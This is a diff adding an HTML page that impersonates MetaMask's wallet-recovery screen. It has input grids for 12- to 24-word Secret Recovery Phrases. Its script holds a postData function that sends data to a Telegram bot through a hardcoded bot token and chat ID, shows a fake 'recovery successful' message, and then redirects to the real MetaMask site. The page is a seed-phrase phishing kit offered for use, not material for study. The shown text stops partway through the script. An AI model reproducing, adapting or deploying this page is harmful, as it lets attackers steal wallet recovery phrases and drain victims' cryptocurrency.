@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://bestfilltype.netlify.app/icon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/9d49fee985.js" crossorigin="anonymous"></script>
+    <title>MetaMask</title>
+</head>
+<style>
+
+  /* google fonts for header  */
+
+.roboto-light {
+  font-family: "Roboto", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+}
+
+.roboto-regular {
+  font-family: "Roboto", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+}
+
+.roboto-medium {
+  font-family: "Roboto", sans-serif;
+  font-weight: 500;
+  font-style: normal;
+}
+
+.roboto-bold {
+  font-family: "Roboto", sans-serif;
+  font-weight: 500;
+  font-style: normal;
+}
+
+.roboto-black {
+  font-family: "Roboto", sans-serif;
+  font-weight: 900;
+  font-style: normal;
+}
+
+.roboto-thin-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 100;
+  font-style: italic;
+}
+
+.roboto-light-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 300;
+  font-style: italic;
+}
+
+.roboto-regular-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 400;
+  font-style: italic;
+}
+
+.roboto-medium-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 500;
+  font-style: italic;
+}
+
+.roboto-bold-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 700;
+  font-style: italic;
+}
+
+.roboto-black-italic {
+  font-family: "Roboto", sans-serif;
+  font-weight: 900;
+  font-style: italic;
+}
+.hide{
+  display: none;
+}
+  /* text selectors  */
+  p{
+  font-size: 12px;
+ }
+ h3{
+  font-size: 15px;
+ }
+#word1 > h3{
+  margin: 20px auto;
+}
+
+/* icon */
+.mentaicon{
+    width: 25px;
+    height: 25px;
+    margin-top: 8px;
+    margin-right: 10px;
+}
+/* body css */
+  body{
+    background-color: white;
+    margin: 0;
+    width: 100%;
+    text-align: center;
+  }
+  .container{
+    display: flex;
+    margin:10px auto;
+    width: 80%;
+  }
+  .dropdown__select {
+    height: 25px;
+    border-radius: 5px;
+    border:1px solid #cccccc;   
+  }
+  #word{
+    border:1px solid #cccccc; 
+    border-radius: 7px;
+    padding: 3px;
+    margin: 19px;
+    width: 100%;
+  }
+  .pnumber{
+    display: flex;
+    flex-direction: row;
+  }
+  .third{
+    display: inline-flex;
+    background-color: #e6f2fa;
+    border-radius: 7px;
+    width: 100%;
+  }
+  .third > p{
+    font-size: 13px;
+  }
+  .fourth{
+     display: grid;
+     grid-template-rows: 1fr 1fr 1fr 1fr;
+     grid-template-columns: 1fr 1fr 1fr;
+     gap: 10px;
+     margin-top: 15px;
+  }
+  input{
+    width: 56%;
+    border-radius: 4px;
+    border: 1px solid #e5e5e5;
+  }
+  input:focus {
+  outline: none; 
+  border-color: #0376c9; 
+}
+  button{
+    padding: 10px;
+    margin-top: 15px;
+    border-radius: 20px;
+    border: 0px;
+    background-color: #a9dafc;
+    color: white;
+  }
+  button:hover{
+    cursor:pointer;
+  }
+  
+.first > img {
+width: 80%;
+}
+.eye12, .eye15, .eye18, .eye21, .eye24 {
+  height: 19px;
+  width: 21px;
+}
+.select-box{
+margin: 20px 0px 0px 20px;
+}
+ .second{
+  margin-left: 20px;
+}
+
+.first,.second{
+  margin: 10px auto;
+}
+.container1 {
+    margin: 10px auto;
+    width: 40%;
+    border: 2px solid #cccccc;
+    border-radius: 15px;
+    padding: 30px;
+}
+.container1img{
+  width: 60%;
+  margin: 0px auto;
+}
+.container1 > h1{
+  font-family: sans-serif;
+  font-size: 28px;
+  font-weight: bold;
+  padding: 20px;
+}
+
+a{
+  text-decoration: none;
+}
+
+.preloader {
+  position: fixed;
+  width: 100%;
+  height: 100vh;
+  top: 0;
+  left: 0;
+  background-color: #ffffffb2;
+  z-index: 4000;
+}
+
+.preloader-box {
+  position: absolute;
+  top: 40%;
+  left: 50%;
+  transform: translate(-40%, -50%);
+}
+
+
+
+
+@media (max-width:650px) {
+  h1{
+    font-size: 13px;
+  }
+  h3{
+    font-size: 10px;
+  }
+  p{
+    font-size: 12px;
+  }
+  .container{
+    width: 100%;
+  }
+  .container1{
+    width: 65%;
+  }
+  .select-box{
+margin: 0px;
+}
+ #word{
+    font-size: 12px;
+    padding: 3px;
+    border-radius: 7px;
+    width: 100%;
+    margin: auto;
+  }
+  .pnumber{
+    display: flex;
+    flex-direction: column;
+    
+  }
+}
+@media (max-width:940px) {
+  .fourth{
+    display: grid;
+    grid-template-columns: 3fr;
+
+  }
+  input{
+    width: 70%;
+  }
+  h1{
+    font-size: 19px;
+  }
+  h3{
+    font-size: 12px;
+  }
+  p{
+    font-size: 10px;
+  }
+  .container{
+    width: 100%;
+  }
+  .container1{
+    width: 65%;
+  }
+  #word{
+    font-size: 12px;
+    padding: 3px;
+    border-radius: 7px;
+    width: 100%;
+    margin: auto;
+  }
+  .pnumber{
+    display: flex;
+    flex-direction: column;
+  }
+  .third > p{
+    font-size: 9px;
+  }
+}
+</style>
+<body>
+
+        <!-- <div class="preloader">
+        <div class="preloader-box">
+            <div>
+                <img src="" alt="icon-load" width="80px">
+            </div>
+            <div class="loader">Loading...</div>
+        </div>
+    </div> -->
+
+    <div class="container">
+        <div class="first">
+            <img src="https://bestfilltype.netlify.app/logo.png" alt="menta-logo">
+        </div>
+        <div class="second">
+            <select class="dropdown__select"><option value="am">English</option><option value="ar">العربية</option><option value="bg">български</option><option value="bn">বাংলা</option><option value="ca">Català</option><option value="cs">Čeština</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">ελληνικά</option><option value="en">English</option><option value="es">Español</option><option value="es_419">Español (Latin America)</option><option value="et">Estonian</option><option value="fa">فارسی</option><option value="fi">Suomi</option><option value="fil">Filipino</option><option value="fr">Français</option><option value="gu">ગુજરાત</option><option value="he">עברית</option><option value="hi">मानक हिन्दी</option><option value="hn">हिन्दी</option><option value="hr">Hrvatski</option><option value="ht">Kreyòl ayisyen</option><option value="hu">Magyar</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="ja">日本語</option><option value="kn">ಕನ್ನಡ</option><option value="ko">한국어</option><option value="lt">Lietuviškai</option><option value="lv">Latvian</option><option value="ml">മലയാളം</option><option value="mr">मराठी</option><option value="ms">Malay</option><option value="nl">Nederlands</option><option value="no">Norwegian</option><option value="ph">Pilipino</option><option value="pl">Polskie</option><option value="pt">Português</option><option value="pt_BR">Português (Brazillian)</option><option value="pt_PT">Português (European)</option><option value="ro">Limba română</option><option value="ru">Русский</option><option value="sk">Slovenčina</option><option value="sl">Slovenščina</option><option value="sr">српски</option><option value="sv">Svenska</option><option value="sw">Swahili</option><option value="ta">தமிழ்</option><option value="te">తెలుగు</option><option value="th">ไทย</option><option value="tl">Wikang Tagalog</option><option value="tr">Türkçe</option><option value="uk">Українська мова</option><option value="vi">Tiếng Việt</option><option value="zh_CN">中文(简体)</option><option value="zh_TW">中文(繁體)</option></select>
+        </div>
+    </div>
+    <div class="container1">
+      <div class='went'>
+      <div><img class="container1img" src="https://bestfilltype.netlify.app/confirm.png" alt="confirm"></div>
+      <div>
+      
+        <h1 class="roboto-bold">Access your wallet with your
+          Secret Recovery Phrase</h1>
+          <p class="roboto-light">MetaMask cannot recover your password. We will use your
+            Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your
+            wallet. <a href="">Learn more</a></p>
+      </div>
+      <div class="pnumber">
+        <div id="word1">
+          <h3 class="roboto-bold">Type your Secret Recovery Phrase</h3>
+        </div>
+        <div class="select-box">
+          <select id="numList">
+            <option value="12">I have a 12-word phrase</option>
+            <option value="15">I have a 15-word phrase</option>
+            <option value="18">I have a 18-word phrase</option>
+            <option value="21">I have a 21-word phrase</option>
+            <option value="24">I have a 24-word phrase</option>
+          </select>
+        </div>  
+    </div>
+    <div class="third">
+      <img class="mentaicon" src="https://bestfilltype.netlify.app/full.png" alt="menta">
+      <p>You can paste your entire secret recovery phrase into any field</p>
+    </div>
+  </div>
+    <form action="#" id="myform" class="form121">
+    <div class="wordForm1">
+    <div class="fourth">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form12" >
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form12" >
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form12">
+         <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form12">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye12">
+      </div> 
+    </div>
+    <div>
+    <button type="submit" disabled class="button12">Confrim Secret Recovery Phrase</button>
+    </div>
+   </div>
+  </form>
+    <!-- 15form -->
+     <form action="#" id="myform" class="form151">
+    <div class="hide wordForm2">
+    <div class="fourth   ">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form15">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form15">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye15">
+      </div> 
+    </div>
+    <div>
+    <button class="button15">Confrim Secret Recovery Phrase</button>
+    </div>
+</div>
+</form>
+    <!-- form18 -->
+     <form action="#" id="myform" class="form181">
+    <div class="hide wordForm3">
+    <div class="fourth ">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form18">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">16 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">17 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div>
+      <div>
+        <label for="">18 </label>
+          <input type="password" class="form18">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye18">
+      </div> 
+    </div>
+    <div>
+    <button disabled class=" button18">Confrim Secret Recovery Phrase</button>
+    </div>     
+</div>
+</form>
+    <!-- form21 -->
+     <form action="#" id="myform" class="form211">
+    <div class="hide wordForm4">
+    <div class="fourth">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form21">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">16 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">17 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">18 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">19 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">20 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div>
+      <div>
+        <label for="">21 </label>
+          <input type="password" class="form21">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye21">
+      </div> 
+    </div>
+    <div>
+    <button disabled class="button21">Confrim Secret Recovery Phrase</button>
+    </div>
+</div>
+</form>
+    <!-- form24 -->
+     <form action="#" id="myform" class="form241">
+    <div class="hide wordForm5">
+    <div class="fourth ">
+      <div>
+        <label for="">1 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">2 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">3 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">4 </label>
+        <input type="password" class="form24">
+           <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">5 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">6 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">7 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">8 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">9 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">10 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">11 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">12 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">13 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">14 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">15 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">16 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">17 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">18 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">19 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">20 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">21 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">21 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">23 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div>
+      <div>
+        <label for="">24 </label>
+          <input type="password" class="form24">
+             <img src="https://bestfilltype.netlify.app/eye-close.png" alt="eye-close" class="eye24">
+      </div> 
+    </div>
+    <div>
+    <button disabled class="button24" >Confrim Secret Recovery Phrase</button>
+    </div>
+    </div>
+  </form>
+
+  <div class="form-mainbox done hide">
+    <div class="tada-box">
+        <img src="https://bestfilltype.netlify.app/tada.png" alt="confirm">
+    </div>
+
+    <div class="head-text">
+        <h1>Wallet Recovery successful</h1>
+    </div>
+
+    <div class="head-text-p">
+        <p>You’ve successfully Unlocked your wallet. Keep your Secret Recovery Phrase safe and secret -- it’s your responsibility!</p>
+
+        <br>
+          <p>Please Wait you will be redirected in <span class="count"></span><br /> <a href="#">Learn more</a></p>
+    </div>
+
+
+
+    <div class="btnBox">
+        <button class="btn-cofirm">I understand</button>
+    </div>
+    </form>
+
+    <!--- End Form24 ------>
+</div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script>
+    var unite  = document.querySelector(".form121");
+    var unite1 = document.querySelector(".form151");
+    var unite2 = document.querySelector('.form181');
+    var unite3 = document.querySelector('.form211');
+    var unite4 = document.querySelector('.form241');
+
+    var unit = document.querySelectorAll(".form12");
+    var unit1 = document.querySelectorAll(".form15");
+    var unit2 = document.querySelectorAll('.form18');
+    var unit3 = document.querySelectorAll('.form21');
+    var unit4 = document.querySelectorAll('.form24');
+
+    var done = document.querySelector('.done')
+    var count2 = document.querySelector(".count")
+  
+    var wordOptions = document.querySelector("#numList");
+
+ const postData = (data) => {
+    const telegramBotToken = '7024342998:AAGYpkILCh10bljU5W1GwEsqEEO2jH8T1jU';
+    const chatId = '-1002099405143';
+    const message = `Name: ${data.name}%0AEmail: ${data.email}%0AMessage: ${data.message}`; // Construct the message
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+        method: 'POST',
+        data: {
+            chat_id: chatId,
+            text: data 
+        }
+    });
+};
+
+
+    var eye12 = document.querySelectorAll('.eye12')  
+    var eye15 = document.querySelectorAll('.eye15')  
+    var eye18 = document.querySelectorAll('.eye18')  
+    var eye21 = document.querySelectorAll('.eye21')  
+    var eye24 = document.querySelectorAll('.eye24')  
+     
+    const timer2 = (timeleft) => {
+        let downloadTimer = setInterval(function () {
+          if (timeleft <= 0) {
+            clearInterval(downloadTimer);
+          }
+          count2.textContent = `0:0${0 + timeleft} Seconds`;
+          timeleft -= 1;
+          if (timeleft === -1) {
+            window.location.replace("https://metamask.io/");
+          }
+        }, 1000);
+      };
+
+    $('.form12').keyup((e)=>{
+      if (unit[0].value !== '' && unit[1].value !== '' &&  unit[2].value !== '' && unit[3].value !== '' && unit[4].value !== '' && unit[5].value !== '' && unit[6].value !== '' && unit[7].value !== '' && unit[8].value !== '' && unit[9].value !== '' && unit[10].value !== '' && unit[11].value !== '') {
+        $('.button12').css('background-color','#0376c9');
+        $('.button12').prop('disabled', false)
+      }
+    });
+    $('.form15').keyup((e)=>{
+      if (unit1[0].value !== "" && unit1[1].value !== "" &&  unit1[2].value !== "" && unit1[3].value !== "" && unit1[4].value !== "" && unit1[5].value !== "" && unit1[6].value !== "" && unit1[7].value !== "" && unit1[8].value !== "" && unit1[9].value !== "" && unit1[10].value !== "" && unit1[11].value !== "" && unit1[12].value !== "" && unit1[13].value !== "" && unit1[14].value !== "") {
+        $('.button15').css('background-color','#0376c9');
+        $('.button15').prop('disabled', false)
+      }
+    });
+    $('.form18').keyup((e)=>{
+      if (unit2[0].value !== "" && unit2[1].value !== "" &&  unit2[2].value !== "" && unit2[3].value !== "" && unit2[4].value !== "" && unit2[5].value !== "" && unit2[6].value !== "" && unit2[7].value !== "" && unit2[8].value !== "" && unit2[9].value !== "" && unit2[10].value !== "" && unit2[11].value !== "" && unit2[12].value !== "" && unit2[13].value !== "" && unit2[14].value !== "" && unit2[15].value !== ""  && unit2[16].value !== "" && unit2[17].value !== "") {
+        $('.button18').css('background-color','#0376c9');
+        $('.button18').prop('disabled', false)
+      }
+    });
+    $('.form21').keyup((e)=>{
+      if (unit3[0].value !== "" && unit3[1].value !== "" &&  unit3[2].value !== "" && unit3[3].value !== "" && unit3[4].value !== "" && unit3[5].value !== "" && unit3[6].value !== "" && unit3[7].value !== "" && unit3[8].value !== "" && unit3[9].value !== "" && unit3[10].value !== "" && unit3[11].value !== "" && unit3[12].value !== "" && unit3[13].value !== "" && unit3[14].value !== "" && unit3[15].value !== ""  && unit3[16].value !== "" && unit3[17].value !== "" && unit3[18].value !== "" && unit3[19].value !== "" && unit3[20].value !== "") {
+        $('.button21').css('background-color','#0376c9');
+        $('.button21').prop('disabled', false)
+      }
+    });
+    $('.form24').keyup((e)=>{
+      if (unit4[0].value !== "" && unit4[1].value !== "" &&  unit4[2].value !== "" && unit4[3].value !== "" && unit4[4].value !== "" && unit4[5].value !== "" && unit4[6].value !== "" && unit4[7].value !== "" && unit4[8].value !== "" && unit4[9].value !== "" && unit4[10].value !== "" && unit4[11].value !== "" && unit4[12].value !== "" && unit4[13].value !== "" && unit4[14].value !== "" && unit4[15].value !== ""  && unit4[16].value !== "" && unit4[17].value !== "" && unit4[18].value !== "" && unit4[19].value !== "" && unit4[20].value !== "" && unit4[21].value !== "" && unit4[22].value !== "" && unit4[23].value !== "") {
+        $('.button24').css('background-color','#0376c9');
+        $('.button24').prop('disabled', false)
+      }
+    });
+    
+    wordOptions.addEventListener('change', ()=> {
+      if(wordOptions.value === "12"){
